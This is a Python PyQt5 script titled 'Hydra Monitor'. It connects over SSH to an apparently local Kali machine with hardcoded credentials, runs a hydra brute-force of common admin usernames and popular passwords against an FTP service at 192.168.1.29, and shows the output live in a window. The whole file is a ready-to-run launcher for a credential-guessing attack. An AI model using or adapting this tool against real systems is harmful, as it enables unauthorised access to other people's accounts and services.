import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QTextEdit
from PyQt5.QtCore import QThread, pyqtSignal
import paramiko
import re

class HydraWorker(QThread):
    update_signal = pyqtSignal(str)

    def __init__(self, hostname, username, password, parent=None):
        super().__init__(parent)
        self.hostname = hostname
        self.username = username
        self.password = password

    def run(self):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(self.hostname, port=60022, username=self.username, password=self.password)
            shell = ssh_client.invoke_shell()
            shell.send("hydra -L CommonAdminBase64.txt -P 2023-200_most_used_passwords.txt 192.168.1.29 ftp\n")
            output = ""
            while True:
                if shell.recv_ready():
                    output += shell.recv(1024).decode()
                    self.update_signal.emit(output)
                    if "command completed" in output:
                        break
            ssh_client.close()
        except Exception as e:
            self.update_signal.emit(str(e))

class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("Hydra Monitor")
        self.setGeometry(100, 100, 600, 400)

        layout = QVBoxLayout()
        self.text_edit = QTextEdit()
        self.text_edit.setReadOnly(True)
        layout.addWidget(self.text_edit)
        self.setLayout(layout)

    def update_text(self, text):
        # Remove ANSI escape codes from the text
        clean_text = re.sub(r'\x1b\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]', '', text)
        self.text_edit.append(clean_text)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()

    # Replace these values with your SSH connection details
    hostname = "127.0.0.1"
    username = "kali"
    password = "root"

    hydra_worker = HydraWorker(hostname, username, password)
    hydra_worker.update_signal.connect(window.update_text)
    hydra_worker.start()

    sys.exit(app.exec_())
